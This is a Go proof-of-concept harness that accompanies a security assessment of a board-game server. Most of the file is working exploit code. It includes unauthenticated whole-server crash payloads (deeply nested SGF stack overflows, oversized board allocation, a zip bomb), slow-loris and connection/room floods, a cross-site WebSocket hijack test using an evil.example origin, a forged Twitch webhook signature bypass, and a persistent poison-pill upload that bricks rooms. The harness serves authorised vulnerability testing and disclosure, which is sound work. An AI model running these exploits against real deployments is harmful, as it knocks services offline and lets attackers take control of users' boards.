// Command poc is a proof-of-concept harness for the Critical and High findings
// in ../../../SECURITY_ASSESSMENT.md.
//
// It is intended to be run ONLY against a local, disposable test instance of
// golab/board that you own and are authorised to test. Several PoCs crash or
// exhaust the target (that is the finding). Do not point it at production or at
// any system you do not control.
//
// Build/run:
//
//	go run ./security/poc/harness <finding-id> [flags]
//
// Finding IDs: c1 c2 c3 c4 c5 c6 c7 h1 h2 h3 h4 h5 h6 h7
// Run with no arguments for the full list.
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	stdzip "archive/zip"

	izip "github.com/golab/board/internal/zip"
	"github.com/golab/board/pkg/core/board"
	"github.com/golab/board/pkg/core/color"
	"github.com/golab/board/pkg/core/coord"
	"github.com/golab/board/pkg/core/parser"
	"github.com/golab/board/pkg/state"
	"golang.org/x/net/websocket"
)

// ---- shared config ------------------------------------------------------

var (
	target string // host:port of the target, e.g. localhost:8080
	origin string // Origin header to present (used by h1)
)

func parseCommon(args []string) []string {
	rest := []string{}
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-target":
			i++
			target = args[i]
		case "-origin":
			i++
			origin = args[i]
		default:
			rest = append(rest, args[i])
		}
	}
	return rest
}

func requireTarget() {
	if target == "" {
		fmt.Println("this PoC needs a live target. pass -target host:port (e.g. -target localhost:8080)")
		fmt.Println("run it ONLY against a local disposable instance you own.")
		os.Exit(2)
	}
}

func banner(id, title string) {
	fmt.Printf("\n=== PoC %s — %s ===\n", strings.ToUpper(id), title)
}

// ---- websocket client (mirrors the repo's own wire framing) -------------

// The server frames application messages as: 4-byte little-endian length
// prefix, followed by that many bytes of JSON (see pkg/event/channel.go).
type wsClient struct{ ws *websocket.Conn }

func dial(room string) (*wsClient, error) {
	requireTarget()
	u := url.URL{Scheme: "ws", Host: target, Path: "/socket/b/" + room}
	org := origin
	if org == "" {
		org = "http://" + target
	}
	cfg, err := websocket.NewConfig(u.String(), org)
	if err != nil {
		return nil, err
	}
	cfg.Header.Set("User-Agent", "golab-poc")
	ws, err := websocket.DialConfig(cfg)
	if err != nil {
		return nil, err
	}
	return &wsClient{ws}, nil
}

// sendFramed writes a well-formed [len][payload] application message.
func (c *wsClient) sendFramed(payload string) error {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(len(payload)))
	if _, err := c.ws.Write(buf); err != nil {
		return err
	}
	_, err := c.ws.Write([]byte(payload))
	return err
}

// sendRaw writes arbitrary bytes straight onto the socket (for malformed framing).
func (c *wsClient) sendRaw(b []byte) error {
	_, err := c.ws.Write(b)
	return err
}

func (c *wsClient) drainOne() {
	_ = c.ws.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	buf := make([]byte, 4096)
	_, _ = c.ws.Read(buf)
	_ = c.ws.SetReadDeadline(time.Time{})
}

func (c *wsClient) close() { _ = c.ws.Close() }

// serverAlive is a crude liveness probe against the public /api/ping endpoint.
func serverAlive() bool {
	requireTarget()
	cl := &http.Client{Timeout: 3 * time.Second}
	resp, err := cl.Get("http://" + target + "/api/ping")
	if err != nil {
		return false
	}
	_ = resp.Body.Close()
	return resp.StatusCode == 200
}

func reportCrash(before bool) {
	time.Sleep(1 * time.Second)
	after := serverAlive()
	fmt.Printf("server /api/ping before: %v, after: %v\n", before, after)
	if before && !after {
		fmt.Println(">> TARGET IS DOWN — vulnerability confirmed (whole process crashed).")
	} else if before && after {
		fmt.Println(">> target still responding; check server logs for a panic/stack trace,")
		fmt.Println("   or increase the payload. (An unrecovered panic there == full crash.)")
	}
}

// helpers for building event JSON
func event(typ, valueJSON string) string {
	return fmt.Sprintf(`{"event":%q,"value":%s}`, typ, valueJSON)
}

// =========================================================================
// CRITICAL
// =========================================================================

// C-1: unchecked type assertion in handleUpdateSettings -> panic.
// VALIDATED: net/http's per-request recover() catches this synchronous panic, so
// it drops ONLY this connection and logs "http: panic serving ..." — it does NOT
// crash the whole server. Still a per-connection DoS + log-spam + latent crash
// (the same unchecked assertions are fatal in spawned goroutines: see the OGS
// plugin / heartbeat). The real whole-server crashes are C-6, H-7 (stack
// overflow) and C-3, C-5 (OOM), which bypass recover().
func pocC1() {
	banner("c1", "update_settings type-assertion panic (RECOVERED by net/http — per-connection DoS)")
	before := serverAlive()
	c, err := dial("poc-c1")
	if err != nil {
		fmt.Println("dial error:", err)
		return
	}
	defer c.close()
	c.drainOne()
	// value is a STRING, but handleUpdateSettings does evt.Value().(map[string]any)
	// -> panic: interface conversion. (An empty object {} also panics on the
	// subsequent sMap["buffer"].(float64).)
	payload := event("update_settings", `"not-a-map"`)
	fmt.Println("sending:", payload)
	if err := c.sendFramed(payload); err != nil {
		fmt.Println("send error:", err)
	}
	reportCrash(before)
}

// C-2: malformed GIB coordinate -> alphabet[x] index panic. Calls the real
// parser directly (this is exactly what an upload_sgf of this GIB reaches).
func pocC2() {
	banner("c2", "Index-out-of-range panic on malformed GIB (STO coordinate)")
	gib := "\\HS\n\\HE\n\\GS\nSTO 0 0 1 25 0\n\\GE"
	fmt.Printf("feeding malicious GIB to parser.New(...).Parse():\n%q\n", gib)
	if target != "" {
		fmt.Println("(also uploadable end-to-end via upload_sgf: base64 =", base64.StdEncoding.EncodeToString([]byte(gib)), ")")
	}
	func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf(">> PANIC: %v\n", r)
				fmt.Println(">> VALIDATED: via an upload this panics inside the request goroutine, which")
				fmt.Println(">> net/http RECOVERS -> the connection dies, the server survives. Per-connection")
				fmt.Println(">> DoS + log spam. It WOULD crash the server if reached from a spawned goroutine")
				fmt.Println(">> (e.g. the OGS plugin loop). Fix the bounds check regardless.")
			}
		}()
		_, _ = parser.New(gib).Parse()
		fmt.Println("no panic (unexpected)")
	}()
}

// C-3: unbounded board size in update_settings -> NewBoard O(size^2) OOM.
func pocC3() {
	banner("c3", "Board-size memory exhaustion via update_settings")
	before := serverAlive()
	c, err := dial("poc-c3")
	if err != nil {
		fmt.Println("dial error:", err)
		return
	}
	defer c.close()
	c.drainOne()
	// A well-formed settings object with an enormous size. NewBoard allocates
	// size x size color cells. 200000^2 = 4e10 cells -> OOM.
	val := `{"buffer":250,"size":200000,"nickname":"x","black":"","white":"","komi":"","password":""}`
	payload := event("update_settings", val)
	fmt.Println("sending update_settings with size=200000 (allocates ~size^2 cells)")
	if err := c.sendFramed(payload); err != nil {
		fmt.Println("send error:", err)
	}
	reportCrash(before)
}

// C-4: no maximum message size. VALIDATED: readBytes does NOT pre-allocate the
// declared length; it grows the buffer incrementally as bytes actually arrive.
// So a 4-byte "0xFFFFFFFF" frame does not instantly allocate 4 GB. The real bug
// is that there is NO upper bound on message size and NO read deadline: a client
// can make the server buffer as much as it is willing to send (per connection),
// and can stall mid-message to pin a goroutine forever (the H-4 slow-loris).
func pocC4() {
	banner("c4", "No max WebSocket message size + no read deadline (unbounded buffering / slow-loris)")
	before := serverAlive()
	c, err := dial("poc-c4")
	if err != nil {
		fmt.Println("dial error:", err)
		return
	}
	defer c.close()
	c.drainOne()
	// Declare a ~4 GB payload, then send only a few bytes. readPacket trusts the
	// length and readBytes loops allocating toward it (no max-size check).
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, 0xFFFFFFFF)
	fmt.Println("declaring a 4 GiB message, then feeding bytes the server dutifully buffers (no cap)...")
	if err := c.sendRaw(hdr); err != nil {
		fmt.Println("send error:", err)
	}
	// Each chunk is retained server-side in `message` with no ceiling. Send more
	// (or open many connections) to grow memory without bound. Stop sending and
	// the server's readBytes blocks forever with no deadline (slow-loris, H-4).
	for i := 0; i < 64; i++ {
		_ = c.sendRaw(bytes.Repeat([]byte("A"), 1024))
		time.Sleep(20 * time.Millisecond)
	}
	fmt.Println("the server has buffered everything sent so far and is now blocked waiting for the")
	fmt.Println("rest of the 4 GiB — goroutine + buffer pinned with no timeout. Scale up to exhaust RAM.")
	reportCrash(before)
}

// C-5: zip bomb -> unbounded in-memory decompression. Calls the real
// internal/zip.Decompress on a tiny archive that inflates massively.
func pocC5() {
	banner("c5", "ZIP bomb — unbounded in-memory decompression")
	mb := 512 // uncompressed size of the single entry, in MiB
	var raw bytes.Buffer
	zw := stdzip.NewWriter(&raw)
	w, _ := zw.Create("bomb.sgf")
	zeros := make([]byte, 1<<20) // 1 MiB of zeros compresses to almost nothing
	for i := 0; i < mb; i++ {
		_, _ = w.Write(zeros)
	}
	_ = zw.Close()
	comp := raw.Bytes()
	fmt.Printf("crafted zip: compressed=%d bytes, declares %d MiB uncompressed (ratio ~%dx)\n",
		len(comp), mb, (mb<<20)/len(comp))
	fmt.Println("calling internal/zip.Decompress (no per-entry / total / count caps)...")
	files, err := izip.Decompress(comp)
	if err != nil {
		fmt.Println("decompress error:", err)
		return
	}
	total := 0
	for _, f := range files {
		total += len(f)
	}
	fmt.Printf(">> Decompress returned %d bytes into memory from a %d-byte upload.\n", total, len(comp))
	fmt.Println(">> Scale mb up (or add entries) to OOM the process. Real upload path: upload_sgf with a zip.")
}

// C-6: deeply nested SGF -> unbounded recursion -> stack overflow (fatal).
// VALIDATED end-to-end: this is a genuine unauthenticated WHOLE-SERVER crash.
// A stack overflow is a fatal runtime error that net/http's recover() cannot
// catch. Delivery: the upload_sgf STRING branch caps decoded input at 1 MiB
// (limiting depth below the overflow threshold), BUT the ARRAY branch
//
//	{"event":"upload_sgf","value":["<base64 of 12,000,000 '(' >"]}
//
// has NO size cap and reaches the same parser -> confirmed crash of the whole
// process via POST /api/v1/room/{board} (see security/poc/README.md for the
// exact request). This local call demonstrates the same fatal recursion.
func pocC6() {
	banner("c6", "Stack overflow via deeply nested SGF (CONFIRMED whole-server crash; array upload bypasses 1MB cap)")
	depth := 12000000
	sgf := strings.Repeat("(", depth)
	fmt.Printf("feeding %d nested '(' to parser.New(...).Parse()\n", depth)
	fmt.Println(">> WARNING: a Go stack overflow is a FATAL error that recover() CANNOT catch.")
	fmt.Println(">> This harness process will crash now — same fatal error the server suffers via the")
	fmt.Println(">> uncapped upload_sgf array branch (value as a JSON list).")
	_, _ = parser.New(sgf).Parse()
	fmt.Println("no crash (unexpected — try a larger depth)")
}

// C-7: unauthenticated HTTP API drives any room's state (and triggers the crashes).
func pocC7() {
	banner("c7", "Unauthenticated state manipulation + crash via POST /api/v1/room/{board}")
	requireTarget()
	before := serverAlive()
	// Same type-confusion payload as C-1, but over plain HTTP with no auth.
	body := event("update_settings", `"not-a-map"`)
	u := "http://" + target + "/api/v1/room/poc-c7"
	fmt.Println("POST", u)
	fmt.Println("body:", body)
	resp, err := http.Post(u, "application/json", strings.NewReader(body))
	if err != nil {
		fmt.Println("request error (server may have just died):", err)
	} else {
		b, _ := io.ReadAll(resp.Body)
		_ = resp.Body.Close()
		fmt.Printf("response: %s %s\n", resp.Status, strings.TrimSpace(string(b)))
	}
	fmt.Println("note: this endpoint needs no authentication and has no request-body size limit.")
	fmt.Println("VALIDATED: the type-assertion panic itself is recovered by net/http (server survives),")
	fmt.Println("but this same unauthenticated endpoint DELIVERS the real whole-server crashes — send the")
	fmt.Println("C-6 / H-7 array-upload body here (see README) and the process dies with a fatal stack overflow.")
	reportCrash(before)
}

// =========================================================================
// HIGH
// =========================================================================

// H-1: no Origin check -> cross-site WebSocket hijacking (CSWSH).
func pocH1() {
	banner("h1", "No WebSocket Origin check -> CSWSH")
	if origin == "" {
		origin = "http://evil.example"
	}
	fmt.Printf("dialing /socket with a cross-site Origin: %s\n", origin)
	c, err := dial("poc-h1")
	if err != nil {
		fmt.Println("dial error:", err)
		return
	}
	defer c.close()
	// If we can connect and receive the initial frame with a foreign Origin,
	// the server did not validate Origin -> any website can drive a victim's boards.
	_ = c.ws.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 4096)
	n, err := c.ws.Read(buf)
	if err == nil && n > 0 {
		fmt.Printf(">> ACCEPTED cross-origin connection and received %d bytes (initial frame).\n", n)
		fmt.Println(">> Origin is not validated -> CSWSH confirmed. See web/h1_cswsh.html for a browser PoC.")
	} else {
		fmt.Println("no data received:", err)
	}
}

// H-2: unbounded room creation.
func pocH2() {
	banner("h2", "Unbounded room creation -> resource exhaustion")
	requireTarget()
	n := 500
	fmt.Printf("creating %d distinct rooms by connecting to unique board IDs...\n", n)
	start := roomCount()
	var wg sync.WaitGroup
	sem := make(chan struct{}, 64)
	for i := 0; i < n; i++ {
		wg.Add(1)
		sem <- struct{}{}
		go func(i int) {
			defer wg.Done()
			defer func() { <-sem }()
			c, err := dial(fmt.Sprintf("poc-h2-flood-%d", i))
			if err != nil {
				return
			}
			c.drainOne()
			c.close() // even after we disconnect, the room lives ~1h (H-2/M-8)
		}(i)
	}
	wg.Wait()
	time.Sleep(500 * time.Millisecond)
	end := roomCount()
	fmt.Printf(">> /api/stats rooms: before=%d after=%d (grew by ~%d; each also spawned a goroutine).\n",
		start, end, end-start)
}

// H-3: no connection limit / rate limiting.
func pocH3() {
	banner("h3", "No connection limits / rate limiting")
	requireTarget()
	n := 1000
	fmt.Printf("opening %d concurrent connections to a single room...\n", n)
	var held []*wsClient
	var mu sync.Mutex
	var ok int64
	var wg sync.WaitGroup
	sem := make(chan struct{}, 128)
	for i := 0; i < n; i++ {
		wg.Add(1)
		sem <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-sem }()
			c, err := dial("poc-h3")
			if err != nil {
				return
			}
			atomic.AddInt64(&ok, 1)
			mu.Lock()
			held = append(held, c)
			mu.Unlock()
		}()
	}
	wg.Wait()
	fmt.Printf(">> opened %d/%d connections with no throttling or cap. Connections reported by /api/stats: %d\n",
		ok, n, connCount())
	fmt.Println("holding them for 3s, then releasing.")
	time.Sleep(3 * time.Second)
	for _, c := range held {
		c.close()
	}
}

// H-4: no read timeout -> slow-loris (goroutine + memory pinned forever).
func pocH4() {
	banner("h4", "No WebSocket read timeout -> slow-loris")
	c, err := dial("poc-h4")
	if err != nil {
		fmt.Println("dial error:", err)
		return
	}
	c.drainOne()
	// Send a length prefix promising more bytes, then never send them.
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, 4096)
	_ = c.sendRaw(hdr)
	fmt.Println(">> sent a 4-byte prefix promising 4096 bytes, then nothing.")
	fmt.Println(">> The server's ReceiveEvent blocks in readBytes with no deadline, holding a")
	fmt.Println(">> goroutine + partial buffer indefinitely. Repeat cheaply to exhaust the server.")
	fmt.Println("holding the connection open for 30s (Ctrl-C to stop earlier)...")
	time.Sleep(30 * time.Second)
	c.close()
}

// H-5: Twitch webhook HMAC bypass when the signing secret is empty.
func pocH5() {
	banner("h5", "Twitch webhook HMAC bypass when secret is empty")
	requireTarget()
	// A forged EventSub notification with NO valid signature. If the server's
	// configured Twitch secret is empty, twitch.Verify() returns true (fails open)
	// and this is processed as authentic.
	body := `{"subscription":{"type":"channel.chat.message"},` +
		`"event":{"broadcaster_user_id":"1","chatter_user_id":"1",` +
		`"message":{"text":"!setboard attacker-controlled-room"}}}`
	req, _ := http.NewRequest("POST", "http://"+target+"/apps/twitch/callback", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Twitch-Eventsub-Message-Type", "notification")
	req.Header.Set("Twitch-Eventsub-Message-Id", "poc-1")
	req.Header.Set("Twitch-Eventsub-Message-Timestamp", time.Now().UTC().Format(time.RFC3339))
	req.Header.Set("Twitch-Eventsub-Message-Signature", "sha256=deadbeef") // deliberately WRONG
	fmt.Println("POST /apps/twitch/callback with an INVALID signature and forged body.")
	resp, err := (&http.Client{Timeout: 5 * time.Second}).Do(req)
	if err != nil {
		fmt.Println("request error:", err)
		return
	}
	b, _ := io.ReadAll(resp.Body)
	_ = resp.Body.Close()
	fmt.Printf("response: %s %s\n", resp.Status, strings.TrimSpace(string(b)))
	fmt.Println(">> If the secret is unset, the bad signature is accepted (Verify returns true on empty secret).")
	fmt.Println(">> A 2xx / processed response here == authentication bypass.")
}

// H-6: CORRECTED during PoC validation — the NGF/SGF board-size path is NOT
// exploitable. state.FromSGF clamps size > 19 before any board allocation, so a
// huge SZ never reaches board.NewBoard via an upload. This PoC verifies the
// mitigation. The genuinely unbounded board-size DoS is C-3 (update_settings).
func pocH6() {
	banner("h6", "Board size from NGF/SGF — MITIGATED by the FromSGF size>19 clamp (see C-3 for the real bug)")
	_, err := state.FromSGF("(;SZ[50000])")
	fmt.Printf("state.FromSGF(\"(;SZ[50000])\") -> %v\n", err)
	if err != nil {
		fmt.Println(">> The clamp rejects oversized boards; the NGF parser only stores size as a")
		fmt.Println(">> string field and never allocates on it. H-6 is NOT exploitable via upload.")
		fmt.Println(">> The real, unclamped board-size DoS is C-3 (update_settings -> state.NewState).")
	} else {
		fmt.Println(">> UNEXPECTED: clamp did not fire — re-open H-6 as a live finding.")
	}
}

// H-7: deep linear tree -> recursive toSGF -> stack overflow (fatal).
// VALIDATED end-to-end: an unauthenticated whole-server crash. Delivery is the
// uncapped upload_sgf ARRAY branch with TWO entries (>=2 SGFs makes Merge call
// the recursive serializer toSGF):
//
//	{"event":"upload_sgf","value":["<b64 of ( ;x12,000,000 )>","<same>"]}
//
// POSTed to /api/v1/room/{board} crashes the process (trace shows (*SGFNode).toSGF).
func pocH7() {
	banner("h7", "Stack overflow in tree toSGF recursion (CONFIRMED whole-server crash via array upload of 2 SGFs)")
	depth := 12000000
	// One branch, many linear ';' nodes: parses iteratively but builds a deep
	// tree. parser.Merge serialises via the recursive toSGF -> stack overflow.
	sgf := "(" + strings.Repeat(";", depth) + ")"
	fmt.Printf("building a linear SGF of depth %d and calling parser.Merge (reached by multi-file upload)\n", depth)
	fmt.Println(">> WARNING: recursive toSGF overflows the stack; this FATAL error crashes the process.")
	_ = parser.Merge([]string{sgf, sgf})
	fmt.Println("no crash (unexpected — try a larger depth)")
}

// =========================================================================
// SECOND PASS (new findings) — see SECURITY_ASSESSMENT.md §10
// =========================================================================

// P2-B1: colon-less LB label = persistent poison-pill (unrecoverable board).
// CONFIRMED: FromSGF accepts LB[z] (no colon) and UploadSGF commits the state
// BEFORE frame generation; GenerateFullFrame then panics at frame.go:131
// (text := spl[1]). The poison is persisted (ToSGFIX writes LB[z] back and
// Hub.Save stores it), so on every reload the room loads clean then panics on
// the first join -> the board is permanently unjoinable (bricked). The per-join
// panic is in the request goroutine (recovered -> server survives), but the
// ROOM is unrecoverable; if the room has the OGS plugin active it escalates to a
// whole-server crash (generateMarks runs in the OGS goroutine).
func pocB1() {
	banner("b1", "Colon-less LB label = persistent poison-pill (unrecoverable board)")
	sgf := "(;GM[1]FF[4]SZ[19]LB[z])" // LB value has NO colon
	b64 := base64.StdEncoding.EncodeToString([]byte(sgf))
	fmt.Printf("poison SGF: %s\n", sgf)
	fmt.Printf("unauthenticated e2e: POST /api/v1/room/{id}  {\"event\":\"upload_sgf\",\"value\":%q}\n", b64)
	if target != "" {
		body := event("upload_sgf", fmt.Sprintf("%q", b64))
		resp, err := http.Post("http://"+target+"/api/v1/room/poc-b1", "application/json", strings.NewReader(body))
		if err == nil {
			_ = resp.Body.Close()
			fmt.Printf("upload response: %s (state now committed+poisoned)\n", resp.Status)
			fmt.Println(">> now try to open ws /socket/b/poc-b1 — the join panics on GenerateFullFrame;")
			fmt.Println(">> the room is bricked and, once persisted, stays bricked across restarts.")
		}
	}
	// local proof of the exact panic:
	s, err := state.FromSGF(sgf)
	if err != nil {
		fmt.Println("FromSGF err (unexpected):", err)
		return
	}
	fmt.Println("FromSGF OK — poisoned state committed")
	func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf(">> GenerateFullFrame PANIC: %v\n", r)
				fmt.Println(">> every join re-triggers this; persisted -> board permanently unjoinable.")
			}
		}()
		_ = s.GenerateFullFrame(state.Full)
		fmt.Println("no panic (unexpected)")
	}()
}

// P2-A1: Board.Set nil/out-of-bounds -> whole-server crash via the OGS review
// plugin goroutine. CONFIRMED: Board.Set (board.go:127) has no nil/bounds guard,
// and Legal() calls the guarded Get() first (returns Empty for off-board, so the
// move is NOT rejected) then the unguarded Set(). An OGS review whose moves are
// off-board/pass feed Board.Move from inside `go o.loop()` (ogs.go:198) — a
// spawned goroutine net/http does NOT recover -> whole process aborts.
// Delivery e2e needs an attacker-authored online-go.com review + request_sgf;
// this local call proves the fatal panic the goroutine would suffer.
func pocA1() {
	banner("a1", "Board.Set nil/OOB -> whole-server crash via OGS review goroutine (not recovered)")
	fmt.Println("e2e (unauth): create an online-go.com review with an off-board/pass move, then send")
	fmt.Println("  {\"event\":\"request_sgf\",\"value\":\"https://online-go.com/review/<id>\"} to a password-less room.")
	fmt.Println("  The move is parsed and played in `go o.loop()` (ogs.go:198) — a goroutine outside net/http's recover.")
	for _, tc := range []struct {
		name string
		c    *coord.Coord
	}{
		{"off-board (1000,1000)", coord.NewCoord(1000, 1000)},
		{"negative (-1,-1)", coord.NewCoord(-1, -1)},
	} {
		func() {
			defer func() {
				if r := recover(); r != nil {
					fmt.Printf(">> [%s] PANIC in Board.Move: %v\n", tc.name, r)
				}
			}()
			b := board.NewBoard(19)
			b.Move(tc.c, color.Black) // Legal -> Get (guarded, passes) -> Set (UNGUARDED) -> panic
			fmt.Printf("[%s] no panic (unexpected)\n", tc.name)
		}()
	}
	fmt.Println(">> In the OGS goroutine this panic is UNRECOVERED -> the whole server crashes.")
}

// =========================================================================

func roomCount() int { return statField("rooms") }
func connCount() int { return statField("connections") }

func statField(field string) int {
	requireTarget()
	resp, err := (&http.Client{Timeout: 3 * time.Second}).Get("http://" + target + "/api/stats")
	if err != nil {
		return -1
	}
	defer resp.Body.Close() //nolint:errcheck
	b, _ := io.ReadAll(resp.Body)
	// tiny hand parse to avoid pulling in the event types
	s := string(b)
	key := `"` + field + `":`
	i := strings.Index(s, key)
	if i < 0 {
		return -1
	}
	j := i + len(key)
	n := 0
	for j < len(s) && s[j] >= '0' && s[j] <= '9' {
		n = n*10 + int(s[j]-'0')
		j++
	}
	return n
}

var pocs = []struct {
	id, title string
	run       func()
}{
	{"c1", "update_settings type-assertion panic (recovered by net/http -> Medium)", pocC1},
	{"c2", "GIB coordinate index panic (recovered by net/http -> Medium)", pocC2},
	{"c3", "Board-size memory exhaustion (CONFIRMED)", pocC3},
	{"c4", "No max message size + no read deadline (was 'instant 4GB' -> corrected)", pocC4},
	{"c5", "ZIP bomb (CONFIRMED)", pocC5},
	{"c6", "Deeply nested SGF stack overflow (CONFIRMED whole-server crash)", pocC6},
	{"c7", "Unauthenticated HTTP API control + crash delivery (CONFIRMED)", pocC7},
	{"h1", "No WebSocket Origin check / CSWSH (CONFIRMED)", pocH1},
	{"h2", "Unbounded room creation (CONFIRMED)", pocH2},
	{"h3", "No connection limits / rate limiting (CONFIRMED)", pocH3},
	{"h4", "No read timeout / slow-loris", pocH4},
	{"h5", "Twitch HMAC bypass on empty secret (CONFIRMED)", pocH5},
	{"h6", "NGF/SGF board size — MITIGATED, not exploitable (see C-3)", pocH6},
	{"h7", "Tree toSGF stack overflow (CONFIRMED whole-server crash, elevated to Critical)", pocH7},
	{"b1", "[pass2] Colon-less LB label poison-pill — unrecoverable board (CONFIRMED)", pocB1},
	{"a1", "[pass2] Board.Set nil/OOB via OGS goroutine — whole-server crash (CONFIRMED)", pocA1},
}

func usage() {
	fmt.Println("golab/board security PoC harness")
	fmt.Println("usage: go run ./security/poc/harness <finding-id> [-target host:port] [-origin url]")
	fmt.Println("\nfindings:")
	for _, p := range pocs {
		fmt.Printf("  %-4s %s\n", p.id, p.title)
	}
	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1  (h6 verifies a mitigation)")
	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5")
	fmt.Println("b1 also runs e2e when -target is given (uploads the poison, then you join to brick it)")
	fmt.Println("\nWARNING: several PoCs crash or exhaust the target. Authorised local testing only.")
}

func main() {
	if len(os.Args) < 2 {
		usage()
		return
	}
	id := strings.ToLower(os.Args[1])
	_ = parseCommon(os.Args[2:])
	for _, p := range pocs {
		if p.id == id {
			p.run()
			return
		}
	}
	fmt.Println("unknown finding id:", id)
	usage()
	os.Exit(2)
}
